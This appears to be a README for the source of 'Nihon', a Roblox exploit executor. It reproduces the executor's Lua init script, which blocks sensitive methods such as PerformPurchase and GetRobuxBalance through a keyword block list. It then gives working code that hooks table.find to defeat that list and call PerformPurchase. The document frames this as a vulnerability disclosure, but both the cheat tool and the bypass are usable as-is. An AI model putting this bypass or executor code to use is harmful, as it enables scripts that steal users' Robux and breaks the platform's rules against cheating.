# Nihon Exploit Source
> Source code for the roblox exploit "Nihon"

# Vulnerability
> The current init script that Nihon uses leaves users vulnerable to those old robux stealing exploits

<details>
<summary>The current code to prevent this in the init script:</summary>

```lua
local Keywords = {
    "OpenScreenshotsFolder",
    "OpenVideosFolder",
    "ReportAbuse",
    "GetMessageId",
    "Publish",
    "OpenBrowserWindow",
    "ExecuteJavaScript",
    "GetRobuxBalance",
    "PerformPurchase"
}
local Metatable = getrawmetatable(game)
local Game = game

local OldMetatable = Metatable.__namecall

-- Namecall
setreadonly(Metatable, false)
Metatable.__namecall = function(Self, ...)
    local Method = getnamecallmethod()
    if Method == "HttpGet" or Method == "HttpGetAsync" then
        return HttpGet(...)
    elseif Method == "GetObjects" then
        return GetObjects(...)
    end
    if table.find(Keywords, getnamecallmethod()) then
        return "Attempt to call protected function"
    end
    return OldMetatable(Self, ...)
end

local OldIndex = Metatable.__index

-- Index
setreadonly(Metatable, false)
Metatable.__index = function(Self, i)
    if Self == game then
        if i == "HttpGet" or i == "HttpGetAsync" then
            return HttpGet
        elseif i == "GetObjects" then
            return GetObjects
        end
    end
    if table.find(Keywords, i) then
        return "Attempt to call protected function"
    end
    return OldIndex(Self, i)
end
```

</details>

<details>
<summary>An example of code to circumvent this:</summary>
  
```lua
local Keywords = {
    "OpenScreenshotsFolder",
    "OpenVideosFolder",
    "ReportAbuse",
    "GetMessageId",
    "Publish",
    "OpenBrowserWindow",
    "ExecuteJavaScript",
    "GetRobuxBalance",
    "PerformPurchase"
}

local Hook do
    Hook = hookfunction(table.find, function(Array, Value, Init)
        local IsBadKeyword = Hook(Keywords, Value)
        
        if IsBadKeyword ~= nil then
            return nil
        end
        
        return Hook(Array, Value, Init)
    end)
end

game:GetService("MarketplaceService"):PerformPurchase() -- shouldnt error
```

</details>

> This is definitely fixable in lua.. for now, but there will always be ways to get past this as long as the protection is written in lua.
